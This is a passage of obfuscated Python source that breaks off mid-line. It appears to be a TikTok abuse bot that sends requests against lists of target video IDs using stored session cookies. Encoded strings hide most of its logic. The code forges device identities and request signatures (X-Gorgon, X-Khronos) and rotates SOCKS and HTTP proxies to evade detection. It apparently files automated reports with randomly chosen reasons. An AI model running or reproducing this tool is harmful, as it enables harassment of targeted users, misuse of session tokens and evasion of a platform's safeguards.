__sx__(b\'BafGzJcbhrDTZrYT0Sk1tDFTLMWkB86Qu49m5hLRLcWkD8483FXIzUnIxdklnLub5mA99Ph3ZFhYeHdKa6KRfc73XLGfgZmRH0B9vDFU/w==\', 125)\n    return {__sx__(b\'kDIjwMHB6OjssOkp\', 232): proxy_url, __sx__(b\'PJ6PbG1tbEJEQshGcA==\', 68): proxy_url}\n\ndef _build_headers_minimal() -> dict:\n    __sx__(b\'+FqlDVGNAsCAw38ZIotgjo5hgGY8kP/Oo6yA3pR5Ua24yRQgscSn6TdxiH3qU3S1wRROOjFnQJd41CnGpW/g4C/apyzy+8gXGfWFeGAbgZxlmfTcpFMcHS6x1epALzyu2Jvjd8XqHVntNq4D6jYxcHzFbpxYMmPn8ggPlUcZdYcLss8K\', 128)\n    return {__sx__(b\'xmTN8vDwk5Zvy3P1cPF3cvW5vpUTuxs=\', 190): __sx__(b\'PZ8O6o9plRQNDAiODGkMQEVk4kGZ\', 69), __sx__(b\'xGbPcnN39/GSdXBzv7ypGbit\', 188): __sx__(b\'RuTNcHMT7kvy9xJ1Oz4tcj2a\', 62), __sx__(b\'oQOqlZeX9PEILJAVkvaUlZbc2fIZ3Hs=\', 217): __sx__(b\'7E7fWUeZmULdWSe6IKFEJ0TduJanWJXA25Iw\', 148)}\n\ndef process_line(line: str):\n    __sx__(b\'0nBJ+KoosQHEXHVy0slnJzegsK/vU78zA2+QoLMDI4MD728woJ3xxBx28tTJWSf/nXx38tXJU2f8rxpqcDHnnRHFhv0SG0hsUDG3nXG+xIYUcw/ayZE6FVZsZLGBXxLqzKmqWA+ciA==\', 170)\n    proxy_url = _normalize_proxy(line, default_scheme=__sx__(b\'8lBBoqOjioqO0otL\', 138))\n    proxies = _to_requests_proxies(proxy_url)\n    headers = _build_headers_minimal()\n    return (proxies, headers)\n\ndef process_lines(lines):\n    results = []\n    if not lines:\n        return results\n    with ThreadPoolExecutor(max_workers=10) as executor:\n        futures = [executor.submit(process_line, line) for line in lines]\n        for future in as_completed(futures):\n            results.append(future.result())\n    return results\n\ndef update_file_loop():\n    __sx__(b\'BqRb8D9w/E5qOoninFELnX/C8k9vbW0oBHzKXmxJID9tNfU2dmXHt7ITgtsjgtqNoeHnOorf3Z9nMJ6v3xnzKCYe+qlHvtN76Hgx6P8uZ211ZEfYpaMYAbasu0xs4AteeAJONwj0HHH10Xiqxllf82vkNvnXaX+Khtdf0YQbt2LdFl/1yWgOr9i/vvRp8hQanxkvye20cUMOvELaeYrbg3IR1UeQce4H99I=\', 126)\n    global ls\n    while True:\n        new_lines = read_file()\n        ls = new_lines\n        _ = process_lines(new_lines)\n        time.sleep(120)\nls = read_file()\n_ = process_lines(ls)\nthread = threading.Thread(target=update_file_loop, daemon=True)\nthread.start()\n\ndef afr(aweme_id, sessionid):\n    global tr, fa, er\n    proxies1 = str(random.choice(ls))\n    _rticket = int(time.time() * 1000)\n    ts = str(int(time.time() * 1000))[:10]\n    from uuid import uuid4\n    uid = str(uuid4())\n    install_id = random.randrange(7334285683765348101, 7334285999999999999)\n    device_id = random.randrange(7283928371561793029, 7283929999999999999)\n    openudid = str(binascii.hexlify(os.urandom(8)).decode())\n    tz_name = random.choice([__sx__(b\'yWvCffyce/3/ZUb6nD4+fZ57t7GD+Leh\', 177), __sx__(b\'1HbfgYFmg+R5W2Vj52Vjr6yOZqmm\', 172), __sx__(b\'qwmg/x2fB9waHH0f1NPAedAX\', 211), __sx__(b\'x2XMk5KRlvVzdvNrsBHzdvQSu7+K7bnt\', 191), __sx__(b\'JYcucZMRiaqTkpQTcRRZXUaCWSg=\', 93), __sx__(b\'qgihHp//GJ6cBiUb/VylHpmdH5v/1NKU9dX8\', 210), __sx__(b\'KYsifHybfhmEXhl9m31XUUznVc4=\', 81), __sx__(b\'5EbvsFLQSOu10dZQmJyPvZ8P\', 156), __sx__(b\'NZc+gQBghwEDmUIDgcJCBWGAhEpNdQ5LKA==\', 77), __sx__(b\'nz2UyymrM+gpryusKK8r4+fHauM2\', 231)])\n    webcast_language = random.choice([__sx__(b\'qwmYHtDT0unTBw==\', 211), __sx__(b\'BKY3UXp8fUN8pQ==\', 124), __sx__(b\'E7EgQGlraitrsg==\', 107), __sx__(b\'Dqw9P3N2d1l2vA==\', 118), __sx__(b\'uhgJiMbCw/XCDg==\', 194), __sx__(b\'asg5OhMSE0QS9w==\', 18), __sx__(b\'vR8O6cTFxI3FGw==\', 197), __sx__(b\'wmCRkL+6u+G6Ug==\', 186), __sx__(b\'6kjZvpCSk6SSRg==\', 146), __sx__(b\'Z8XU1xsfHiQfzQ==\', 31)])\n    current_region = random.choice([__sx__(b\'+FqLjYaAgH+AKQ==\', 128), __sx__(b\'M5FAvk1LS7xL6g==\', 75), __sx__(b\'qwmgpdfT0xrTVg==\', 211), __sx__(b\'ROZPMDk8POU8qw==\', 60), __sx__(b\'wGJLTLu4uFq4IA==\', 184), __sx__(b\'gSOK8/v5+SH5bA==\', 249), __sx__(b\'nT+W7ufl5QXlfA==\', 229), __sx__(b\'F7UcHmpvb6Bv5Q==\', 111), __sx__(b\'nT8W6eTl5Q3lew==\', 229), __sx__(b\'AaMKdH95eaZ54A==\', 121), __sx__(b\'4ELr7JqYmF6YHA==\', 152)])\n    region = random.choice([__sx__(b\'FbdmYGttbZJtxA==\', 109), __sx__(b\'XP4v0SIkJNMkhQ==\', 36), __sx__(b\'0HLb3qyoqGGoLQ==\', 168), __sx__(b\'333Uq6Knp36nMA==\', 167), __sx__(b\'uxkwN8DDwyHDWw==\', 195), __sx__(b\'jiyF/PT29i72Yw==\', 246), __sx__(b\'KIojW1JQULBQyQ==\', 80), __sx__(b\'mzmQkubj4yzjaQ==\', 227), __sx__(b\'c9H4BwoLC+MLlQ==\', 11), __sx__(b\'bc9mGBMVFcoVjA==\', 21)])\n    screen_height = random.randint(600, 1080)\n    screen_width = random.randint(800, 1920)\n    samsung = [__sx__(b\'jC7/AiGBQ8DDgff0/ZH29A==\', 244), __sx__(b\'UPIj3v1dHx0eWi8oIWwp3g==\', 40), __sx__(b\'edsK99T0sjU2dAIBCIkDBg==\', 1), __sx__(b\'tRfGOxi4enl9xcjNxLDP3g==\', 205), __sx__(b\'Sug5xOdHhQYFPTcyO0owIw==\', 50), __sx__(b\'pQfWKwio6ertqC7e3da03+I=\', 221), __sx__(b\'x2W0SWrKi4qLsoq7v7TbvY8=\', 191), __sx__(b\'/lyNcFPzMbKz84WGj9mHeA==\', 134), __sx__(b\'O5lItZY2d3R2M0RDSnNCsQ==\', 67), __sx__(b\'ymi5RGdHAYaBwrGyu8mwsw==\', 178), __sx__(b\'9VeGe1j4Orm+hYiNhOqPhA==\', 141), __sx__(b\'gyHwDS4OycjLi/j78rL6Dw==\', 251), __sx__(b\'nz3sETKSU9NXl+Xn7tPmFQ==\', 231), __sx__(b\'gCLzDi2NzM/IjQ/9+POS+sc=\', 248), __sx__(b\'hyX0CSqKSMvI9/r/9pX99Q==\', 255), __sx__(b\'ZMYX6slpKCosa+8fHBdHHiE=\', 28), __sx__(b\'w2GwTW7ODI+Ito6/u7ALuYQ=\', 187), __sx__(b\'40GQbU7ur6mv7JibkoaadA==\', 155), __sx__(b\'ZMYX6slpq6gsbx4cFXod4g==\', 28), __sx__(b\'LoxdoIMjYmRmoVNWX3dXow==\', 86), __sx__(b\'z228QWLCg4KDurC3voG1tg==\', 183), __sx__(b\'H71skbISU1JXEmBnbkRmlw==\', 103), __sx__(b\'MZNCv5w8fX99PE5JQFdIpg==\', 73), __sx__(b\'uRvKNxS09fTxtjLCwcqkw/4=\', 193), __sx__(b\'ljTlGDub2tve49vq7uWO7ME=\', 238), __sx__(b\'VvQl2PtbmRoZIS8uJ1ksPg==\', 46), __sx__(b\'3nytUHPTkpaU06Gmr7OnSw==\', 166), __sx__(b\'4UOSb0xsq6+r6ZqZkNqYag==\', 153), __sx__(b\'FrRlmLsbWllaY2luZ1BsbQ==\', 110), __sx__(b\'dNYH+tl5uDi8/A8MBUwN8g==\', 12), __sx__(b\'mTvqFzSU1dPRlOLh6PfgDQ==\', 225), __sx__(b\'ddcG+9h4urm9fQ8NBGcPDQ==\', 13), __sx__(b\'CKp7hqWFw8RAA3JweflydQ==\', 112), __sx__(b\'AaNyj6wMTU5NDHp5cFR4iw==\', 121), __sx__(b\'NJZHupk5eHl4OU9MRWlNvA==\', 76), __sx__(b\'IIJTro0t72xrLVtYUTpZpw==\', 88), __sx__(b\'LI5fooEh42BnJFdUXQxVrg==\', 84), __sx__(b\'IIJTro0tbG1oLVtYUXpZtw==\', 88), __sx__(b\'TO4/wuFBAAYEQzc0PS412g==\', 52), __sx__(b\'Wfsq1/RUFRcRViYhKD4g0Q==\', 33), __sx__(b\'lTfmGziYWtnane7t5LbsFg==\', 237), __sx__(b\'8FKDfl39vLy4/4uIgZ6JZQ==\', 136), __sx__(b\'c9EA/d5+vD89fggLAlIK9w==\', 11), __sx__(b\'jC7/AiGBQ8DCgfD0/aD1Aw==\', 244), __sx__(b\'A6Fwja4OT01PC3h7cmh6kg==\', 123), __sx__(b\'VPYn2vnZHhoeXN8vLCeoLm0=\', 44)]\n    oppo = [__sx__(b\'a8lgHeMjISWmFxMUOxK8\', 19), __sx__(b\'lTee4x3d39zY6u3qxOxD\', 237), __sx__(b\'Xf9WK9UVFxOUISUiAySL\', 37), __sx__(b\'ogCp1Crq6O7r39rdxtty\', 218), __sx__(b\'F7UcYZ9fXd1baW9oSG7D\', 111), __sx__(b\'UvBZJNoaGBwbLCotCiuC\', 42), __sx__(b\'hyWM8Q/PzcvN+P/45f5X\', 255), __sx__(b\'PZ82S7V1d/FxQkVCbUTq\', 69), __sx__(b\'G7kQbZNTUVdUZWNkQ2LK\', 99), __sx__(b\'/130iXe3tbGwg4eAo4Yu\', 135), __sx__(b\'LY8mW6VlZ2fmUVVSclT6\', 85), __sx__(b\'dtR9AP4+PD4+Cw4JHw+t\', 14), __sx__(b\'gCKL9gjIykzI/fj/3PlU\', 248)]\n    realme = [__sx__(b\'CKp7gv1ARkVAdHB3t3Gx\', 112), __sx__(b\'1nSlXCOemB6eq66pYq9m\', 174), __sx__(b\'C6l4gf5Dx0dBd3N0vHK2\', 115), __sx__(b\'6EqbYh2gpqenlJCXS5Fa\', 144), __sx__(b\'+liJcA+ytLOxhoKFUoNE\', 130), __sx__(b\'njztFGvW0FbS5ObhLecg\', 230), __sx__(b\'XP4v1qkUEpIQIiQj8SXu\', 36), __sx__(b\'GrhpkO9SVNRWYGJltmOr\', 98), __sx__(b\'U/Eg2aYbnxsZLyss5yrv\', 43), __sx__(b\'gyHwCXbLT8vJ/vv8K/oz\', 251), __sx__(b\'Vfcm36AdGxsZLS0q7yyS\', 45)]\n    phone = random.choice([samsung, oppo, realme])\n    type1 = random.choice(phone)\n    if __sx__(b\'J4VUqVpfX6pf/g==\', 95) in type1:\n        brand = __sx__(b\'d9UkQcMiIcJECA8DDg3w\', 15)\n        dev = type1.split(__sx__(b\'Q+HoPjs7FTsV\', 59))[1]\n    if __sx__(b\'9FaHfgGMjI1njHQ=\', 140) in type1:\n        brand = __sx__(b\'BqRVNDOytzN7fnbMfAk=\', 126)\n        dev = type1.split(__sx__(b\'XP6vJCQkfSR9\', 36))[1]\n    if __sx__(b\'a8lgHeMTExKnE88=\', 19) in type1:\n        brand = __sx__(b\'Hb+Wam2VYmVmemRa\', 101)\n        dev = type1.split(__sx__(b\'pgQt3t7el96X\', 222))[1]\n    off = int(round((datetime.datetime.now() - datetime.datetime.utcnow()).total_seconds()))\n    if aobsh == __sx__(b\'3X+WoaWll6WX\', 165):\n        time1 = int(datetime.datetime.now().timestamp())\n        reason = str(random.choice(sdsd))\n        pro1 = urlencode({__sx__(b\'AqBxNTeINoszVlRzs7Y3f3pb9X6V\', 122): time1, __sx__(b\'FrQloiJvbmwyb0E=\', 110): __sx__(b\'f900s7O3BwcFHAfc\', 7), __sx__(b\'/F5PzcnLSA1LrqlOqMpNyKpNSEuHhMLpg/g=\', 132): __sx__(b\'9VfGxIiNjKKNRw==\', 141), __sx__(b\'F7VEJaImQiSjROagJkNob0/Hamo=\', 111): __sx__(b\'ZsRNNtEyVE/WVVLQTiaqwtbSRj+m2sNXX903q7q2KkNNvyoxW98rSik2Kye9Wr+mujYvsxba0tcatDFVM1TV0Vcxzx0eASsJ7g==\', 30), __sx__(b\'7E6/3rlcu74d29252pKUiJCQDw==\', 148): __sx__(b\'ymiXPPO8MIKi9x2A+f82N5SsMvY/qIUQXNmr2rH+e8a4Q4yWbPGc1GNv7Q5FQIGmvGe43GGqDoQzmMK3gO6ma5yG+B6R2h9yK+0vCtOov/W6uw4XsMhWFaEWRjYBR/JE86laESbZZ0zpyefRwBasDwb6UNMC7rIbusxsWV+0wIvWAnrM5SSi0MXF/RwaPzKl5Jd9AQPBqgvG/5dbpcG99mI=\', 178), __sx__(b\'iCrbut0439p53z68P7vc2d269fDJDfY+\', 240): __sx__(b\'ROYXcvHxOzw4dD2J\', 60), __sx__(b\'nT8uLKoqyshsyq/ILcrPrMhvqiioKSnk5Yf77TE=\', 229): __sx__(b\'4UOS11RU7tFW1FVVSNJXVpyZvh+c1Q==\', 153), __sx__(b\'oQMSEpUXF5IVlNzZ1wPang==\', 217): nickname, __sx__(b\'3H5v627u6Yota+ilpLbypwA=\', 164): aweme_id, __sx__(b\'Xvztaexsawiv6QnpbQus6WonJhetIAg=\', 38): id, __sx__(b\'+1lIzEpPcM+Cg4v7gds=\', 131): __sx__(b\'LI6fG52YpxhVVFwsVgw=\', 84), __sx__(b\'Suj5Hf15H7j9fjMyPVsxag==\', 50): id, __sx__(b\'J4V0FRJzkZBcX1eLXdY=\', 95): reason, __sx__(b\'S+kYeR77HBm6HJofezYzL083jQ==\', 51): __sx__(b\'ymiZef77f7WytO6wqg==\', 178), __sx__(b\'T+0cfRr/GB1+Gr34ezY3KwIzlw==\', 55): __sx__(b\'M5EAggcCSktIsErd\', 75), __sx__(b\'thTlh+KEgePPzsYQzEY=\', 206): aweme_id, __sx__(b\'03GAYOfiZiRk56qrpVyo7w==\', 171): aweme_id, __sx__(b\'iSs6uD263ry9vvTx/yHytA==\', 241): webcast_language, __sx__(b\'LI6fexyZfxmdGFVUWx5XDQ==\', 84): openudid, __sx__(b\'+FrLrq2qyk2rCa/KzU9MT4OArPiFZw==\', 128): current_region, __sx__(b\'I4FwFXURFpbQlBOWF5RzWlt+J14C\', 91): screen_height, __sx__(b\'JoR1EHAUE5PVcZESd5deXn7XW14=\', 94): screen_width, __sx__(b\'nz1syM0uqympyubn6QnksQ==\', 231): _rticket, __sx__(b\'vhyNj+sNiohL6W/qjsPG3ePCVA==\', 198): type1, __sx__(b\'fN5PTSnPSEqJSy5OyE8FBBuOANM=\', 4): brand, __sx__(b\'91WkwaHFwkIEoEDDpkaPj68Gio8=\', 143): screen_width, __sx__(b\'KYuaGJ0aVlFVS1Dy\', 81): webcast_language, __sx__(b\'FLZHpyAloeOjQ6MnQW5sd99ozg==\', 108): __sx__(b\'ELLjpieiIiVGOZhvO9loRVJtzw==\', 104), __sx__(b\'GripT2yrrSyvYWJp72CA\', 98): __sx__(b\'rA7RFRXaVvTU1AT7ppeRcZdTfBA9BBZizsPjTF7ydH2Nqak73bhgINHlfQ2MGtJg3sBbUg5uXqWF0ImNYw1ycfl30Z3tSuR1kDWjxGJG12ucVT4MtEcvFKNQGi6+FmpQcDUF4CEPe3bVvHQT5YodFuikrRW36au3qmzheqbAk9vjJeobIEibTVcwKtsBBft+\', 212), __sx__(b\'w2Ewa85x9JSWvbuyrrk9\', 187): __sx__(b\'aMpjYRu+Oj4f4+G4YmfkWyVlZR7Y4T8bHBs6Iua7EBCaCxmT\', 16), __sx__(b\'pwVUD6oQlPMVdtvf1CHdLA==\', 223): __sx__(b\'XP4h5W1SphQkJPSP0CYYsKwQbyC9o6Y0Z1LuGCAFIjVq+9tb2LEgvSvfDAQgojNumIBoxU1VMpMTeoU0Z9lr3k5xvAG5R4KQuIN/09l8VoUX93Lq8VfRpqGcvHwebRzx/0UM8UpxoUltK7+ODN/gyB4aRnZECSoAJan4Xc74zOss1UyGVKYIMPyRGRUtqF0KT7NviHLSD/4VvGVZV1mVRcu58JGLjPkQUA5EB7GluCRzZQYzm7yvTBN7OgjJkv64n5gTMeoaHHjuoxGzlSyqPu6pFHaugpVe4+irWJqD1sdqeAWVilAcMDp+cr4lRElrxXSojElZ57QAF/2X+y5B118s2iV8rkCD\', 36), __sx__(b\'rQ9e+huZGp75/Pif0NXDANHn\', 213): __sx__(b\'lzVk2N+d3WbdxCDY7+0sLV0nv1idqKig+CjN4EDzMqXkJCWdXM3MWP+oqDClECuL76DZ4Wg=\', 239)})\n        url = __sx__(b\'xmR1lpeXlghsaZGRkWmVd3KQd3Fo9XBxa/GS8XPza5GNPIxs7O3tLKwtDUtT6zW/Z7+ssQ==\', 190) % pro1\n        h = {__sx__(b\'LowlmJmZmBpTVlGhVA0=\', 86): f\'ttwid=; sid_tt=\' + sessionid + __sx__(b\'2HoT9ojujY5ubG9r7BGloLsxpMo=\', 160) + sessionid + __sx__(b\'rQ9mg/2b+PsbGRoemVz6+2PQ1f4G0Ho=\', 213) + sessionid + __sx__(b\'zG4HsrS0iLSI\', 180), __sx__(b\'Hb9uLyguSC9IZ2Vvomep\', 101): __sx__(b\'/V9OraysrTNXUqqqqlKuTEmrTEpTzktKUPKFhfQnjVQ=\', 133) + g + __sx__(b\'Q+HoFPB3cvbsPDsy1jlN\', 59) + aweme_id, __sx__(b\'YMITVlXObVM1UdbIFdY0UR0YPBcc7Q==\', 24): __sx__(b\'lDbHoiChOSHDJqAjIO/s9QfosA==\', 236), __sx__(b\'mznozq3OMZavrC7I4uP3+OBf\', 227): __sx__(b\'iCr1MTH68tHg8CCvaZPt7IVkVTUjhhmi4JxusyZQsadnolhOTgdmShIfOWmz/St2m48D4oIOuqKUfepkoUDLgxnv9y4xpBJbgvSd7Mw6LT/+FnvIfRMxM0GDfgKGJePiWXHc2p2tm1LWmaDjmnOmxL5dVg3vE6vTcQ==\', 240)}\n        url = __sx__(b\'IIKTcHFxcO6Kj3d3d49zkZR2kZeOE5aXjRd0F5UVjXdr2mqKCgsLykrL6621DdNZgVlKVw==\', 88) % pro1\n        h = {__sx__(b\'vR+2CwoKC4nAxcIyx54=\', 197): f\'ttwid=; sid_tt=\' + sessionid + __sx__(b\'R+WMaRdxEhHx8/D0c446PySuO1U=\', 63) + sessionid + __sx__(b\'bsylQD5YOzjY2tndWp85OKATFj3FE7k=\', 22) + sessionid + __sx__(b\'kjBZ7Orq1urW\', 234), __sx__(b\'zG6//vn/mf6ZtrS+c7Z4\', 180): __sx__(b\'FbemRURERdu/ukJCQrpGpKFDpKK7JqOiuBptbRzPZbw=\', 109) + g + __sx__(b\'yWtinnr9+HxmtrG4XLPH\', 177) + aweme_id, __sx__(b\'UPIjZmX+XWMFYeb4JeYEYS0oDCcs3Q==\', 40): __sx__(b\'L418GZsagpp4nRuYm1RXTrxTCw==\', 87), __sx__(b\'UvAhB2QH+F9mZecBKyo+MSmW\', 42): __sx__(b\'U/HY5oTh5+Ji/xz+GHv7I+TnYOIEBH3bIHobH/sYm30rIbOycwB/s7JDARM9P8+PrYwNUky9w7AxsMAysAJDU1Cv09HDA89PTYwBk4wNTMxAARNMP87MjcEwMSomK2quy++f74lngz0rNPE0jg==\', 43)}\n    if aobsh == __sx__(b\'/120hYeHtIe0\', 135):\n        if xxx == __sx__(b\'IYNqbVhZWcFZPw==\', 89):\n            pro = urlencode({__sx__(b\'N5UEAYYDTk9MvU7a\', 79): uid})\n        else:\n            pro = urlencode({__sx__(b\'8VPCx0DFiImKe4gc\', 137): uid})\n        u = __sx__(b\'50WyWa6RH6+Xn1+Izv3YiEAdFy7eO44zQOhuOaSt5FMXS8Qy72by651cjN0OjArzBTE8L4RNtLmndQDC+8QWigiQ+7yHXw==\', 159)\n        url = u + pro\n        payload = f\'\'\n        signed = ttsign(url.split(__sx__(b\'cNK7DwgISAhI\', 8))[1], payload, None).get_value()\n        x_gorgon = signed[__sx__(b\'G7nIsy6sTCmsrGBjboJgUQ==\', 99)]\n        x_khronos = signed[__sx__(b\'+1koU05Nq0lMSKyFg5IUgCk=\', 131)]\n        xss = signed[__sx__(b\'pQd2DfDzC/CX8AnwFJETk/Dc3fGW2G8=\', 221)]\n        h = {__sx__(b\'XP5X6uvr6mghJCPTJn8=\', 36): f\'sid_tt={sessionid}; sessionid={sessionid}; sessionid_ss={sessionid};\', __sx__(b\'Da9+WDtYpwA5OrhedHVhbnbJ\', 117): f\'com.zhiliaoapp.musically/2023306030 (Linux; U; Android 12; {region}; {type1}; Build/NRD90M.{dev}KSU1AQDC;tt-ok/3.12.13.4-tiktok)\', __sx__(b\'9VcGXfhCosdCQo6NgayPfw==\', 141): x_gorgon, __sx__(b\'3H4vdFFqjG5rb4uipKszp84=\', 164): x_khronos, __sx__(b\'3X8udairc6jXqHGoVNFT06ikpYTuoZc=\', 165): xss}\n    try:\n        r = requests.get(url, headers=h, proxies={__sx__(b\'hSc21dTU1fv9+3H/yQ==\', 253): f\'socks5://{str(random.choice(ls))}\', __sx__(b\'CKq7WFlZWHZwdvxyRA==\', 112): f\'socks4://{str(random.choice(ls))}\', __sx__(b\'331sj46Oj6GnoSulkw==\', 167): f\'http://{str(random.choice(ls))}\'}).text\n        tr += 1\n        if aweme_id in soso:\n            pass\n        else:\n            soso.append(aweme_id)\n        if sessionid in loop:\n            pass\n        else:\n            loop.append(sessionid)\n        bi = random.choice([F, J, Z, C, B, L, J1, J2, J21, J22, F1, C1, P1])\n        print(bi + f\'\\r {len(soso)}/{len(tar)} True :{F}[{tr}] {bi}Net :{Z}[{fa}]{bi} {len(loop)}/{len(sisn)}\', end=__sx__(b\'GrgxYmJiQ2JD\', 98))\n        sys.stdout.flush()\n    except:\n        fa += 1\n        bi = random.choice([F, J, Z, C, B, L, J1, J2, J21, J22, F1, C1, P1])\n        print(bi + f\'\\r {len(soso)}/{len(tar)} True :{F}[{tr}] {bi}Net :{Z}[{fa}]{bi} {len(loop)}/{len(sisn)}\', end=__sx__(b\'0nD5qqqqi6qL\', 170))\n        sys.stdout.flush()\nimport os, re, time, sys, traceback, contextlib, random, threading\nfrom itertools import cycle\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nGREEN = __sx__(b\'z20kOQGDfbK3tMO2+A==\', 183)\nRED = __sx__(b\'QuCptIwO9j86OUg7dA==\', 58)\nCYAN = __sx__(b\'Z8WMkakr1BofHGMeTA==\', 31)\nYELLOW = __sx__(b\'6EoDHiakXpWQk+aRwA==\', 144)\nRESET = __sx__(b\'tRdeQ/sFyM3Pg8zZ\', 205)\nBOLD = __sx__(b\'X/20qRHrIicldyYy\', 39)\nMAX_RETRY_PER_ID = 3\nSLEEP_BETWEEN_IDS = 0.03\nSLEEP_EMPTY_IDS = 1.0\nPRIMARY_FILE = __sx__(b\'ogDpDPFz8tja3qDbGg==\', 218)\nFALLBACK_FILE = __sx__(b\'0nCZfIEDgquqrtaraA==\', 170)\nSESSIONS_FILE = __sx__(b\'edsy1SqoKQABBXMAwQ==\', 1)\nPROXIES_FILE = __sx__(b\'lTcmpsHD3znGRMXs7fzA7pk=\', 237)\nSHUFFLE_PROXIES = True\nMAX_WORKERS = None\n\ndef pick_id_file():\n    path = PRIMARY_FILE if os.path.isfile(PRIMARY_FILE) else FALLBACK_FILE\n    return path if os.path.isfile(path) else None\n\ndef _extract_ids_from_text_file(path):\n    ids, seen = ([], set())\n    with open(path, __sx__(b\'NpRlTE5OPU49\', 78), encoding=__sx__(b\'CataXDiixKFcvz12cX6NclQ=\', 113), errors=__sx__(b\'rQ8emRoe+p/Q1d0Y11A=\', 213)) as f:\n        for line in f:\n            s = line.strip()\n            if not s:\n                continue\n            m = re.search(__sx__(b\'03F4I+ICHXsCfq+roLmpxQ==\', 171), s)\n            v = m.group(1) if m else s\n            if v not in seen:\n                seen.add(v)\n                ids.append(v)\n    return ids\n\ndef load_ids_once():\n    path = pick_id_file()\n    if not path:\n        return []\n    try:\n        return _extract_ids_from_text_file(path)\n    except Exception:\n        return []\n\ndef load_sessions():\n    if not os.path.isfile(SESSIONS_FILE):\n        return []\n    out = []\n    with open(SESSIONS_FILE, __sx__(b\'BadWf319Dn0O\', 125), encoding=__sx__(b\'rw38+p4EYgf6GZvQ19gr1PI=\', 215), errors=__sx__(b\'OpiJDo2JbQhHQkqPQMc=\', 66)) as f:\n        for line in f:\n            s = line.strip()\n            if s:\n                out.append(s)\n    return out\n\ndef format_proxy_url(raw: str) -> str:\n    __sx__(b\'xWcGZMjeZnATJjC3pJiYuOtHR7eKK2Nlzd4Ef3ArJhC3/TRDpqbTi2JlxR76XNt6cBOmVtJRuTcqqxqr5KiZq6qG2VmqKuWoWaooVby9r/uaCg==\', 189)\n    s = raw.strip()\n    if not s:\n        return __sx__(b\'ZMYfHBwcHB0=\', 28)\n    if s.startswith(__sx__(b\'thQF5ufnfhwZyc7EGMyX\', 206)) or s.startswith(__sx__(b\'7U9evby8vSNHQpKVm/aXWQ==\', 149)):\n        return s\n    return __sx__(b\'NZeGZWRk/Z+aSk1Hm08U\', 77) + s\n\ndef load_proxies():\n    if not os.path.isfile(PROXIES_FILE):\n        return []\n    out = []\n    with open(PROXIES_FILE, __sx__(b\'ddcmDw0Nfg1+\', 13), encoding=__sx__(b\'5Ea3sdVPKUyxUtCbnJNgn7k=\', 156), errors=__sx__(b\'a8nYX9zYPFkWExveEZY=\', 19)) as f:\n        for line in f:\n            s = line.strip()\n            if s and (not s.startswith(__sx__(b\'0XP6r6mpjamN\', 169))):\n                out.append(format_proxy_url(s))\n    return out\n\ndef mask_proxy(p):\n    try:\n        scheme, rest = p.split(__sx__(b\'QOKL6u8/ODkGOKE=\', 56), 1) if __sx__(b\'BKbPrqt7fH1CfOU=\', 124) in p else (__sx__(b\'lDYnxMXF7OzotO0t\', 236), p)\n        if __sx__(b\'nz2U5+fnpuem\', 231) in rest:\n            creds, host = rest.split(__sx__(b\'23nQo6Oj4qPi\', 163), 1)\n            if __sx__(b\'Te+GNzU1DjUO\', 53) in creds:\n                user = creds.split(__sx__(b\'D63EdXd3THdM\', 119), 1)[0]\n                return f\'{scheme}://{user}:***@{host}\'\n        return f\'{scheme}://{rest}\' if __sx__(b\'03EYeXysq6qVqzI=\', 171) not in p else p\n    except Exception:\n        return p\n\n@contextlib.contextmanager\ndef proxy_env(proxy_url: str):\n    if not proxy_url:\n        yield\n        return\n    old_http = os.environ.get(__sx__(b\'331Ur66uL6ivVSgvo6e2AaTl\', 167))\n    old_https = os.environ.get(__sx__(b\'701kn56enxmYn2UYH5OXgruUAg==\', 151))\n    os.environ[__sx__(b\'RefONTQ0tTI1z7K1OT0smz5/\', 61)] = proxy_url\n    os.environ[__sx__(b\'0nBZoqOjoiSlolglIq6qv4apPw==\', 170)] = proxy_url\n    try:\n        yield\n    finally:\n        if old_http is None:\n            os.environ.pop(__sx__(b\'T+3EPz4+vzg/xbi/MzcmkTR1\', 55), None)\n        else:\n            os.environ[__sx__(b\'ErCZYmNj4mVimOXibmp7zGko\', 106)] = old_http\n        if old_https is None:\n            os.environ.pop(__sx__(b\'G7mQa2pqa+1sa5Hs62djdk9g9g==\', 99), None)\n        else:\n            os.environ[__sx__(b\'GbuSaWhoae9uaZPu6WVhdE1i9A==\', 97)] = old_https\n\ndef call_afr_with_proxy(aweme_id, sessionid, proxy_url=None):\n    __sx__(b\'I4F21hpVWhpPH6wo0SRZrciDAQHim3eBEdfvEwP5PFMoV6+zS7IfU3zy4daEubRxrgWmF6/jPN7TcwgAdc1mmtLuK1iUQRrRyk5fh6o9nnZBuhVaXPRFxTOqSY5YZUF450FxYe9BlOP/tZNuWVSrxnfmEO51BM7mvmnvKIhGz0iodA0ji76JdJ1oqJjkAkAAJg==\', 91)\n    try:\n        if proxy_url:\n            try:\n                res = afr(aweme_id, sessionid, proxy=proxy_url)\n                return res is True or res is None\n            except TypeError:\n                with proxy_env(proxy_url):\n                    res = afr(aweme_id, sessionid)\n                return res is True or res is None\n        else:\n            res = afr(aweme_id, sessionid)\n            return res is True or res is None\n    except Exception:\n        traceback.print_exc(limit=1, file=sys.stderr)\n        return False\n\nclass ProxyRotator:\n    __sx__(b\'SuhXvAk88AIidsmuUHka0mSGZiaG+nwmqzAKMAa8HlYZFiD4f1Rc8aqwNHls313sfFFIXktzU/0pnSo/MXQnPCGxVKqj5kL0LD2fRLT+ktCfSnTuBKeDAzQeyNd9raPaSwA3dV26qnYeaqbvX40JLGTZLXF82Ab5fVloK5iTlfy4HBtPl1BUFUOYlVgZ+3/2udO5yzK5MLLu\', 50)\n\n    def __init__(self, proxies):\n        self._list = list(proxies) if proxies else []\n        if SHUFFLE_PROXIES and self._list:\n            random.shuffle(self._list)\n        self._cycle = cycle(self._list) if self._list else None\n        self._lock = threading.Lock()\n\n    def next(self):\n        if not self._cycle:\n            return None\n        with self._lock:\n            return next(self._cycle)\n\ndef run_full_for_session(sessionid, ids, rotator: ProxyRotator):\n    __sx__(b\'vB7pSQXJBvTUwDttJu5k4+5M0GFFpN+dOGzlS+TPTOg2zVEosgdaR2F3Chp9XwqwvAdC6ytIQkv7vPGi6LylkQzP7qIHV40lqpzc9W+Zkc9OJRV6TkJnE20/q+mIZjWSJ6Cxdvb3fAJcntb9XWrk/2On73elsxJCuvhLORRYJvON7gflPMVFH7dt\', 196)\n    if not ids:\n        print(f\'{YELLOW}[Session:{sessionid[:6]}] \xd9\x84\xd8\xa7 \xd9\x8a\xd9\x88\xd8\xac\xd8\xaf IDs 